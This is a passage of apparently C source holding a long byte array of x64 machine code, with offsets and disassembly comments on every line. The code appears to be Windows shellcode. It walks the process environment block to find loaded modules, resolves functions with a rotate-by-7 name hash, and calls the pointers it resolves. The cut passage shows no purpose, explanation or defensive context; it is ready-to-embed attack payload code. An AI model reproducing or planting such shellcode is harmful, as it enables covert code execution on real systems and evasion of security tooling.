           */\n\t/* 026D */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 0270 */ \"\\x48\\x89\\x84\\x24\\x80\\x00\\x00\\x00\"                 /* mov [rsp+0x80], rax                      */\n\t/* 0278 */ \"\\xeb\\x3e\"                                         /* jmp 0x2b8                                */\n\t/* 027A */ \"\\x48\\x8b\\x8c\\x24\\x90\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0x90]                      */\n\t/* 0282 */ \"\\xe8\\x69\\x03\\x00\\x00\"                             /* call 0x5f0                               */\n\t/* 0287 */ \"\\x3b\\x44\\x24\\x74\"                                 /* cmp eax, [rsp+0x74]                      */\n\t/* 028B */ \"\\x75\\x2b\"                                         /* jnz 0x2b8                                */\n\t/* 028D */ \"\\x8b\\x44\\x24\\x20\"                                 /* mov eax, [rsp+0x20]                      */\n\t/* 0291 */ \"\\x48\\x8b\\x8c\\x24\\x98\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0x98]                      */\n\t/* 0299 */ \"\\x0f\\xb7\\x04\\x41\"                                 /* movzx eax, word [rcx+rax*2]              */\n\t/* 029D */ \"\\x48\\x8b\\x8c\\x24\\xa0\\x00\\x00\\x00\"                 /* mov rcx, [rsp+0xa0]                      */\n\t/* 02A5 */ \"\\x8b\\x04\\x81\"                                     /* mov eax, [rcx+rax*4]                     */\n\t/* 02A8 */ \"\\x48\\x8b\\x4c\\x24\\x28\"                             /* mov rcx, [rsp+0x28]                      */\n\t/* 02AD */ \"\\x48\\x03\\xc8\"                                     /* add rcx, rax                             */\n\t/* 02B0 */ \"\\x48\\x8b\\xc1\"                                     /* mov rax, rcx                             */\n\t/* 02B3 */ \"\\x48\\x89\\x44\\x24\\x78\"                             /* mov [rsp+0x78], rax                      */\n\t/* 02B8 */ \"\\x48\\x83\\xbc\\x24\\x80\\x00\\x00\\x00\\x00\"             /* cmp qword [rsp+0x80], 0x0                */\n\t/* 02C1 */ \"\\x74\\x3e\"                                         /* jz 0x301                                 */\n\t/* 02C3 */ \"\\x48\\x83\\x7c\\x24\\x78\\x00\"                         /* cmp qword [rsp+0x78], 0x0                */\n\t/* 02C9 */ \"\\x74\\x36\"                                         /* jz 0x301                                 */\n\t/* 02CB */ \"\\x48\\x8d\\x4c\\x24\\x58\"                             /* lea rcx, [rsp+0x58]                      */\n\t/* 02D0 */ \"\\xff\\x54\\x24\\x78\"                                 /* call qword [rsp+0x78]                    */\n\t/* 02D4 */ \"\\x48\\x8d\\x54\\x24\\x30\"                             /* lea rdx, [rsp+0x30]                      */\n\t/* 02D9 */ \"\\x48\\x8b\\xc8\"                                     /* mov rcx, rax                             */\n\t/* 02DC */ \"\\xff\\x94\\x24\\x80\\x00\\x00\\x00\"                     /* call qword [rsp+0x80]                    */\n\t/* 02E3 */ \"\\x48\\x89\\x84\\x24\\xa8\\x00\\x00\\x00\"                 /* mov [rsp+0xa8], rax                      */\n\t/* 02EB */ \"\\x45\\x33\\xc9\"                                     /* xor r9d, r9d                             */\n\t/* 02EE */ \"\\x45\\x33\\xc0\"                                     /* xor r8d, r8d                             */\n\t/* 02F1 */ \"\\x48\\x8d\\x54\\x24\\x40\"                             /* lea rdx, [rsp+0x40]                      */\n\t/* 02F6 */ \"\\x33\\xc9\"                                         /* xor ecx, ecx                             */\n\t/* 02F8 */ \"\\xff\\x94\\x24\\xa8\\x00\\x00\\x00\"                     /* call qword [rsp+0xa8]                    */\n\t/* 02FF */ \"\\xeb\\x05\"                                         /* jmp 0x306                                */\n\t/* 0301 */ \"\\xe9\\xf3\\xfe\\xff\\xff\"                             /* jmp 0x1f9                                */\n\t/* 0306 */ \"\\x48\\x81\\xc4\\xd8\\x00\\x00\\x00\"                     /* add rsp, 0xd8                            */\n\t/* 030D */ \"\\xc3\"                                             /* ret                                      */\n\t/* 030E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 030F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0310 */ \"\\x88\\x4c\\x24\\x08\"                                 /* mov [rsp+0x8], cl                        */\n\t/* 0314 */ \"\\x48\\x83\\xec\\x18\"                                 /* sub rsp, 0x18                            */\n\t/* 0318 */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 031D */ \"\\x83\\xf8\\x41\"                                     /* cmp eax, 0x41                            */\n\t/* 0320 */ \"\\x7c\\x13\"                                         /* jl 0x335                                 */\n\t/* 0322 */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 0327 */ \"\\x83\\xf8\\x5a\"                                     /* cmp eax, 0x5a                            */\n\t/* 032A */ \"\\x7f\\x09\"                                         /* jg 0x335                                 */\n\t/* 032C */ \"\\xc7\\x04\\x24\\x01\\x00\\x00\\x00\"                     /* mov dword [rsp], 0x1                     */\n\t/* 0333 */ \"\\xeb\\x07\"                                         /* jmp 0x33c                                */\n\t/* 0335 */ \"\\xc7\\x04\\x24\\x00\\x00\\x00\\x00\"                     /* mov dword [rsp], 0x0                     */\n\t/* 033C */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 033F */ \"\\x48\\x83\\xc4\\x18\"                                 /* add rsp, 0x18                            */\n\t/* 0343 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 0344 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0345 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0346 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0347 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0348 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0349 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034A */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034B */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034C */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034D */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 034F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0350 */ \"\\x88\\x4c\\x24\\x08\"                                 /* mov [rsp+0x8], cl                        */\n\t/* 0354 */ \"\\x48\\x83\\xec\\x38\"                                 /* sub rsp, 0x38                            */\n\t/* 0358 */ \"\\x0f\\xb6\\x4c\\x24\\x40\"                             /* movzx ecx, byte [rsp+0x40]               */\n\t/* 035D */ \"\\xe8\\xae\\xff\\xff\\xff\"                             /* call 0x310                               */\n\t/* 0362 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0364 */ \"\\x74\\x0e\"                                         /* jz 0x374                                 */\n\t/* 0366 */ \"\\x0f\\xbe\\x44\\x24\\x40\"                             /* movsx eax, byte [rsp+0x40]               */\n\t/* 036B */ \"\\x83\\xc0\\x20\"                                     /* add eax, 0x20                            */\n\t/* 036E */ \"\\x89\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], eax                      */\n\t/* 0372 */ \"\\xeb\\x09\"                                         /* jmp 0x37d                                */\n\t/* 0374 */ \"\\x0f\\xbe\\x44\\x24\\x40\"                             /* movsx eax, byte [rsp+0x40]               */\n\t/* 0379 */ \"\\x89\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], eax                      */\n\t/* 037D */ \"\\x0f\\xb6\\x44\\x24\\x20\"                             /* movzx eax, byte [rsp+0x20]               */\n\t/* 0382 */ \"\\x48\\x83\\xc4\\x38\"                                 /* add rsp, 0x38                            */\n\t/* 0386 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 0387 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0388 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0389 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038A */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038B */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038C */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038D */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 038F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0390 */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 0395 */ \"\\x48\\x83\\xec\\x18\"                                 /* sub rsp, 0x18                            */\n\t/* 0399 */ \"\\xc7\\x04\\x24\\x00\\x00\\x00\\x00\"                     /* mov dword [rsp], 0x0                     */\n\t/* 03A0 */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 03A3 */ \"\\x48\\x8b\\x4c\\x24\\x20\"                             /* mov rcx, [rsp+0x20]                      */\n\t/* 03A8 */ \"\\x0f\\xb7\\x04\\x41\"                                 /* movzx eax, word [rcx+rax*2]              */\n\t/* 03AC */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 03AE */ \"\\x74\\x0a\"                                         /* jz 0x3ba                                 */\n\t/* 03B0 */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 03B3 */ \"\\xff\\xc0\"                                         /* inc eax                                  */\n\t/* 03B5 */ \"\\x89\\x04\\x24\"                                     /* mov [rsp], eax                           */\n\t/* 03B8 */ \"\\xeb\\xe6\"                                         /* jmp 0x3a0                                */\n\t/* 03BA */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 03BD */ \"\\x48\\x83\\xc4\\x18\"                                 /* add rsp, 0x18                            */\n\t/* 03C1 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 03C2 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C3 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C4 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C5 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C6 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C7 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C8 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03C9 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CA */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CB */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CC */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CD */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CE */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03CF */ \"\\xcc\"                                             /* int3                                     */\n\t/* 03D0 */ \"\\x48\\x89\\x54\\x24\\x10\"                             /* mov [rsp+0x10], rdx                      */\n\t/* 03D5 */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 03DA */ \"\\x48\\x83\\xec\\x38\"                                 /* sub rsp, 0x38                            */\n\t/* 03DE */ \"\\xb8\\x01\\x00\\x00\\x00\"                             /* mov eax, 0x1                             */\n\t/* 03E3 */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 03E7 */ \"\\x48\\x8b\\x4c\\x24\\x48\"                             /* mov rcx, [rsp+0x48]                      */\n\t/* 03EC */ \"\\x0f\\xb6\\x04\\x01\"                                 /* movzx eax, byte [rcx+rax]                */\n\t/* 03F0 */ \"\\x88\\x44\\x24\\x22\"                                 /* mov [rsp+0x22], al                       */\n\t/* 03F4 */ \"\\x0f\\xb6\\x4c\\x24\\x22\"                             /* movzx ecx, byte [rsp+0x22]               */\n\t/* 03F9 */ \"\\xe8\\x52\\xff\\xff\\xff\"                             /* call 0x350                               */\n\t/* 03FE */ \"\\x88\\x44\\x24\\x21\"                                 /* mov [rsp+0x21], al                       */\n\t/* 0402 */ \"\\x48\\x8b\\x44\\x24\\x48\"                             /* mov rax, [rsp+0x48]                      */\n\t/* 0407 */ \"\\x48\\x83\\xc0\\x02\"                                 /* add rax, 0x2                             */\n\t/* 040B */ \"\\x48\\x89\\x44\\x24\\x48\"                             /* mov [rsp+0x48], rax                      */\n\t/* 0410 */ \"\\x0f\\xbe\\x44\\x24\\x21\"                             /* movsx eax, byte [rsp+0x21]               */\n\t/* 0415 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0417 */ \"\\x75\\x07\"                                         /* jnz 0x420                                */\n\t/* 0419 */ \"\\x48\\x8b\\x44\\x24\\x40\"                             /* mov rax, [rsp+0x40]                      */\n\t/* 041E */ \"\\xeb\\x7c\"                                         /* jmp 0x49c                                */\n\t/* 0420 */ \"\\x48\\x8b\\x4c\\x24\\x48\"                             /* mov rcx, [rsp+0x48]                      */\n\t/* 0425 */ \"\\xe8\\x66\\xff\\xff\\xff\"                             /* call 0x390                               */\n\t/* 042A */ \"\\x89\\x44\\x24\\x24\"                                 /* mov [rsp+0x24], eax                      */\n\t/* 042E */ \"\\xb8\\x01\\x00\\x00\\x00\"                             /* mov eax, 0x1                             */\n\t/* 0433 */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 0437 */ \"\\x48\\x8b\\x4c\\x24\\x40\"                             /* mov rcx, [rsp+0x40]                      */\n\t/* 043C */ \"\\x0f\\xb6\\x04\\x01\"                                 /* movzx eax, byte [rcx+rax]                */\n\t/* 0440 */ \"\\x88\\x44\\x24\\x23\"                                 /* mov [rsp+0x23], al                       */\n\t/* 0444 */ \"\\x0f\\xb6\\x4c\\x24\\x23\"                             /* movzx ecx, byte [rsp+0x23]               */\n\t/* 0449 */ \"\\xe8\\x02\\xff\\xff\\xff\"                             /* call 0x350                               */\n\t/* 044E */ \"\\x88\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], al                       */\n\t/* 0452 */ \"\\x48\\x8b\\x44\\x24\\x40\"                             /* mov rax, [rsp+0x40]                      */\n\t/* 0457 */ \"\\x48\\x83\\xc0\\x02\"                                 /* add rax, 0x2                             */\n\t/* 045B */ \"\\x48\\x89\\x44\\x24\\x40\"                             /* mov [rsp+0x40], rax                      */\n\t/* 0460 */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 0465 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0467 */ \"\\x75\\x04\"                                         /* jnz 0x46d                                */\n\t/* 0469 */ \"\\x33\\xc0\"                                         /* xor eax, eax                             */\n\t/* 046B */ \"\\xeb\\x2f\"                                         /* jmp 0x49c                                */\n\t/* 046D */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 0472 */ \"\\x0f\\xbe\\x4c\\x24\\x21\"                             /* movsx ecx, byte [rsp+0x21]               */\n\t/* 0477 */ \"\\x3b\\xc1\"                                         /* cmp eax, ecx                             */\n\t/* 0479 */ \"\\x75\\xb3\"                                         /* jnz 0x42e                                */\n\t/* 047B */ \"\\x44\\x8b\\x44\\x24\\x24\"                             /* mov r8d, [rsp+0x24]                      */\n\t/* 0480 */ \"\\x48\\x8b\\x54\\x24\\x48\"                             /* mov rdx, [rsp+0x48]                      */\n\t/* 0485 */ \"\\x48\\x8b\\x4c\\x24\\x40\"                             /* mov rcx, [rsp+0x40]                      */\n\t/* 048A */ \"\\xe8\\x21\\x00\\x00\\x00\"                             /* call 0x4b0                               */\n\t/* 048F */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0491 */ \"\\x75\\x9b\"                                         /* jnz 0x42e                                */\n\t/* 0493 */ \"\\x48\\x8b\\x44\\x24\\x40\"                             /* mov rax, [rsp+0x40]                      */\n\t/* 0498 */ \"\\x48\\x83\\xe8\\x02\"                                 /* sub rax, 0x2                             */\n\t/* 049C */ \"\\x48\\x83\\xc4\\x38\"                                 /* add rsp, 0x38                            */\n\t/* 04A0 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 04A1 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A2 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A3 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A4 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A5 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A6 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A7 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A8 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04A9 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AA */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AB */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AC */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AD */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AE */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04AF */ \"\\xcc\"                                             /* int3                                     */\n\t/* 04B0 */ \"\\x44\\x89\\x44\\x24\\x18\"                             /* mov [rsp+0x18], r8d                      */\n\t/* 04B5 */ \"\\x48\\x89\\x54\\x24\\x10\"                             /* mov [rsp+0x10], rdx                      */\n\t/* 04BA */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 04BF */ \"\\x48\\x83\\xec\\x38\"                                 /* sub rsp, 0x38                            */\n\t/* 04C3 */ \"\\x8b\\x44\\x24\\x50\"                                 /* mov eax, [rsp+0x50]                      */\n\t/* 04C7 */ \"\\xff\\xc8\"                                         /* dec eax                                  */\n\t/* 04C9 */ \"\\x89\\x44\\x24\\x50\"                                 /* mov [rsp+0x50], eax                      */\n\t/* 04CD */ \"\\xb8\\x01\\x00\\x00\\x00\"                             /* mov eax, 0x1                             */\n\t/* 04D2 */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 04D6 */ \"\\x48\\x8b\\x4c\\x24\\x40\"                             /* mov rcx, [rsp+0x40]                      */\n\t/* 04DB */ \"\\x0f\\xb6\\x04\\x01\"                                 /* movzx eax, byte [rcx+rax]                */\n\t/* 04DF */ \"\\x88\\x44\\x24\\x20\"                                 /* mov [rsp+0x20], al                       */\n\t/* 04E3 */ \"\\x48\\x8b\\x44\\x24\\x40\"                             /* mov rax, [rsp+0x40]                      */\n\t/* 04E8 */ \"\\x48\\x83\\xc0\\x02\"                                 /* add rax, 0x2                             */\n\t/* 04EC */ \"\\x48\\x89\\x44\\x24\\x40\"                             /* mov [rsp+0x40], rax                      */\n\t/* 04F1 */ \"\\xb8\\x01\\x00\\x00\\x00\"                             /* mov eax, 0x1                             */\n\t/* 04F6 */ \"\\x48\\x6b\\xc0\\x00\"                                 /* imul rax, rax, 0x0                       */\n\t/* 04FA */ \"\\x48\\x8b\\x4c\\x24\\x48\"                             /* mov rcx, [rsp+0x48]                      */\n\t/* 04FF */ \"\\x0f\\xb6\\x04\\x01\"                                 /* movzx eax, byte [rcx+rax]                */\n\t/* 0503 */ \"\\x88\\x44\\x24\\x21\"                                 /* mov [rsp+0x21], al                       */\n\t/* 0507 */ \"\\x48\\x8b\\x44\\x24\\x48\"                             /* mov rax, [rsp+0x48]                      */\n\t/* 050C */ \"\\x48\\x83\\xc0\\x02\"                                 /* add rax, 0x2                             */\n\t/* 0510 */ \"\\x48\\x89\\x44\\x24\\x48\"                             /* mov [rsp+0x48], rax                      */\n\t/* 0515 */ \"\\x0f\\xb6\\x4c\\x24\\x20\"                             /* movzx ecx, byte [rsp+0x20]               */\n\t/* 051A */ \"\\xe8\\x31\\xfe\\xff\\xff\"                             /* call 0x350                               */\n\t/* 051F */ \"\\x0f\\xbe\\xc0\"                                     /* movsx eax, al                            */\n\t/* 0522 */ \"\\x89\\x44\\x24\\x28\"                                 /* mov [rsp+0x28], eax                      */\n\t/* 0526 */ \"\\x0f\\xb6\\x4c\\x24\\x21\"                             /* movzx ecx, byte [rsp+0x21]               */\n\t/* 052B */ \"\\xe8\\x20\\xfe\\xff\\xff\"                             /* call 0x350                               */\n\t/* 0530 */ \"\\x0f\\xbe\\xc0\"                                     /* movsx eax, al                            */\n\t/* 0533 */ \"\\x8b\\x4c\\x24\\x28\"                                 /* mov ecx, [rsp+0x28]                      */\n\t/* 0537 */ \"\\x2b\\xc8\"                                         /* sub ecx, eax                             */\n\t/* 0539 */ \"\\x8b\\xc1\"                                         /* mov eax, ecx                             */\n\t/* 053B */ \"\\x89\\x44\\x24\\x24\"                                 /* mov [rsp+0x24], eax                      */\n\t/* 053F */ \"\\x83\\x7c\\x24\\x24\\x00\"                             /* cmp dword [rsp+0x24], 0x0                */\n\t/* 0544 */ \"\\x75\\x1d\"                                         /* jnz 0x563                                */\n\t/* 0546 */ \"\\x0f\\xbe\\x44\\x24\\x20\"                             /* movsx eax, byte [rsp+0x20]               */\n\t/* 054B */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 054D */ \"\\x74\\x14\"                                         /* jz 0x563                                 */\n\t/* 054F */ \"\\x0f\\xbe\\x44\\x24\\x21\"                             /* movsx eax, byte [rsp+0x21]               */\n\t/* 0554 */ \"\\x85\\xc0\"                                         /* test eax, eax                            */\n\t/* 0556 */ \"\\x74\\x0b\"                                         /* jz 0x563                                 */\n\t/* 0558 */ \"\\x83\\x7c\\x24\\x50\\x00\"                             /* cmp dword [rsp+0x50], 0x0                */\n\t/* 055D */ \"\\x0f\\x87\\x60\\xff\\xff\\xff\"                         /* ja 0x4c3                                 */\n\t/* 0563 */ \"\\x8b\\x44\\x24\\x24\"                                 /* mov eax, [rsp+0x24]                      */\n\t/* 0567 */ \"\\x48\\x83\\xc4\\x38\"                                 /* add rsp, 0x38                            */\n\t/* 056B */ \"\\xc3\"                                             /* ret                                      */\n\t/* 056C */ \"\\xcc\"                                             /* int3                                     */\n\t/* 056D */ \"\\xcc\"                                             /* int3                                     */\n\t/* 056E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 056F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0570 */ \"\\x44\\x89\\x44\\x24\\x18\"                             /* mov [rsp+0x18], r8d                      */\n\t/* 0575 */ \"\\x48\\x89\\x54\\x24\\x10\"                             /* mov [rsp+0x10], rdx                      */\n\t/* 057A */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 057F */ \"\\x48\\x83\\xec\\x28\"                                 /* sub rsp, 0x28                            */\n\t/* 0583 */ \"\\x48\\x8b\\x44\\x24\\x38\"                             /* mov rax, [rsp+0x38]                      */\n\t/* 0588 */ \"\\x48\\x89\\x44\\x24\\x10\"                             /* mov [rsp+0x10], rax                      */\n\t/* 058D */ \"\\x48\\x8b\\x44\\x24\\x30\"                             /* mov rax, [rsp+0x30]                      */\n\t/* 0592 */ \"\\x48\\x89\\x44\\x24\\x08\"                             /* mov [rsp+0x8], rax                       */\n\t/* 0597 */ \"\\x8b\\x44\\x24\\x40\"                                 /* mov eax, [rsp+0x40]                      */\n\t/* 059B */ \"\\x89\\x04\\x24\"                                     /* mov [rsp], eax                           */\n\t/* 059E */ \"\\x8b\\x44\\x24\\x40\"                                 /* mov eax, [rsp+0x40]                      */\n\t/* 05A2 */ \"\\xff\\xc8\"                                         /* dec eax                                  */\n\t/* 05A4 */ \"\\x89\\x44\\x24\\x40\"                                 /* mov [rsp+0x40], eax                      */\n\t/* 05A8 */ \"\\x83\\x3c\\x24\\x00\"                                 /* cmp dword [rsp], 0x0                     */\n\t/* 05AC */ \"\\x74\\x2b\"                                         /* jz 0x5d9                                 */\n\t/* 05AE */ \"\\x48\\x8b\\x44\\x24\\x08\"                             /* mov rax, [rsp+0x8]                       */\n\t/* 05B3 */ \"\\x48\\x8b\\x4c\\x24\\x10\"                             /* mov rcx, [rsp+0x10]                      */\n\t/* 05B8 */ \"\\x0f\\xb6\\x09\"                                     /* movzx ecx, byte [rcx]                    */\n\t/* 05BB */ \"\\x88\\x08\"                                         /* mov [rax], cl                            */\n\t/* 05BD */ \"\\x48\\x8b\\x44\\x24\\x08\"                             /* mov rax, [rsp+0x8]                       */\n\t/* 05C2 */ \"\\x48\\xff\\xc0\"                                     /* inc rax                                  */\n\t/* 05C5 */ \"\\x48\\x89\\x44\\x24\\x08\"                             /* mov [rsp+0x8], rax                       */\n\t/* 05CA */ \"\\x48\\x8b\\x44\\x24\\x10\"                             /* mov rax, [rsp+0x10]                      */\n\t/* 05CF */ \"\\x48\\xff\\xc0\"                                     /* inc rax                                  */\n\t/* 05D2 */ \"\\x48\\x89\\x44\\x24\\x10\"                             /* mov [rsp+0x10], rax                      */\n\t/* 05D7 */ \"\\xeb\\xbe\"                                         /* jmp 0x597                                */\n\t/* 05D9 */ \"\\x48\\x8b\\x44\\x24\\x30\"                             /* mov rax, [rsp+0x30]                      */\n\t/* 05DE */ \"\\x48\\x83\\xc4\\x28\"                                 /* add rsp, 0x28                            */\n\t/* 05E2 */ \"\\xc3\"                                             /* ret                                      */\n\t/* 05E3 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E4 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E5 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E6 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E7 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E8 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05E9 */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EA */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EB */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EC */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05ED */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EE */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05EF */ \"\\xcc\"                                             /* int3                                     */\n\t/* 05F0 */ \"\\x48\\x89\\x4c\\x24\\x08\"                             /* mov [rsp+0x8], rcx                       */\n\t/* 05F5 */ \"\\x48\\x83\\xec\\x18\"                                 /* sub rsp, 0x18                            */\n\t/* 05F9 */ \"\\xc7\\x04\\x24\\x00\\x00\\x00\\x00\"                     /* mov dword [rsp], 0x0                     */\n\t/* 0600 */ \"\\x48\\x8b\\x44\\x24\\x20\"                             /* mov rax, [rsp+0x20]                      */\n\t/* 0605 */ \"\\x48\\x89\\x44\\x24\\x08\"                             /* mov [rsp+0x8], rax                       */\n\t/* 060A */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 060D */ \"\\xc1\\xe0\\x07\"                                     /* shl eax, 0x7                             */\n\t/* 0610 */ \"\\x8b\\x0c\\x24\"                                     /* mov ecx, [rsp]                           */\n\t/* 0613 */ \"\\xc1\\xe9\\x19\"                                     /* shr ecx, 0x19                            */\n\t/* 0616 */ \"\\x03\\xc1\"                                         /* add eax, ecx                             */\n\t/* 0618 */ \"\\x48\\x8b\\x4c\\x24\\x08\"                             /* mov rcx, [rsp+0x8]                       */\n\t/* 061D */ \"\\x0f\\xb6\\x09\"                                     /* movzx ecx, byte [rcx]                    */\n\t/* 0620 */ \"\\x03\\xc1\"                                         /* add eax, ecx                             */\n\t/* 0622 */ \"\\x89\\x04\\x24\"                                     /* mov [rsp], eax                           */\n\t/* 0625 */ \"\\x48\\x8b\\x44\\x24\\x08\"                             /* mov rax, [rsp+0x8]                       */\n\t/* 062A */ \"\\x0f\\xb6\\x00\"                                     /* movzx eax, byte [rax]                    */\n\t/* 062D */ \"\\x89\\x44\\x24\\x04\"                                 /* mov [rsp+0x4], eax                       */\n\t/* 0631 */ \"\\x48\\x8b\\x44\\x24\\x08\"                             /* mov rax, [rsp+0x8]                       */\n\t/* 0636 */ \"\\x48\\xff\\xc0\"                                     /* inc rax                                  */\n\t/* 0639 */ \"\\x48\\x89\\x44\\x24\\x08\"                             /* mov [rsp+0x8], rax                       */\n\t/* 063E */ \"\\x83\\x7c\\x24\\x04\\x00\"                             /* cmp dword [rsp+0x4], 0x0                 */\n\t/* 0643 */ \"\\x75\\xc5\"                                         /* jnz 0x60a                                */\n\t/* 0645 */ \"\\x8b\\x04\\x24\"                                     /* mov eax, [rsp]                           */\n\t/* 0648 */ \"\\x48\\x83\\xc4\\x18\"                                 /* add rsp, 0x18                            */\n\t/* 064C */ \"\\xc3\"                                             /* ret                                      */\n\t/* 064D */ \"\\xcc\"                                             /* int3                                     */\n\t/* 064E */ \"\\xcc\"                                             /* int3                                     */\n\t/* 064F */ \"\\xcc\"                                             /* int3                                     */\n\t/* 0650 */ \"\\x48\\x81\\xec\\x88\\x02\\x00\\x00\"                     /* sub rsp, 0x288                           */\n\t/* 0657 */ \"\\x48\\xc7\\x44\\x24\\x60\\xff\\xff\\xff\\xff\"             /* mov qword [rsp+0x60], 0xffffffffffffffff */\n\t/* 0660 */ \"\\x65\\x48\\x8b\\x04\\x25\\x60\\x00\\x00\\x00\"             /* mov rax, [gs:0x60]                       */\n\t/* 0669 */ \"\\x48\\x89\\x44\\x24\\x68\"                             /* mov [rsp+0x68], rax                      */\n\t/* 066E */ \"\\x48\\x8b\\x44\\x24\\x68\"                             /* mov rax, [rsp+0x68]                      */\n\t/* 0673 */ \"\\x48\\x8b\\x40\\x18\"                                 /* mov rax, [rax+0x18]                      */\n\t/* 0677 */ \"\\x48\\x83\\xc0\\x20\"                                 /* add rax, 0x20                            */\n\t/* 067B */ \"\\x48\\x89\\x44\\x24\\x58\"                             /* mov [rsp+0x58], rax                      */\n\t/* 0680 */ \"\\x48\\x8b\\x44\\x24\\x58\"                             /* mov rax, [rsp+0x58]                      */\n\t/* 0685 */ \"\\x48\\x8b\\x00\"                                     /* mov rax, [rax]                           */\n\t/* 0688 */ \"\\x48\\x89\\x44\\x24\\x30\"                             /* mov [rsp+0x30], rax                      */\n\t/* 068D */ \"\\xb8\\x6b\\x00\\x00\\x00\"                             /* mov 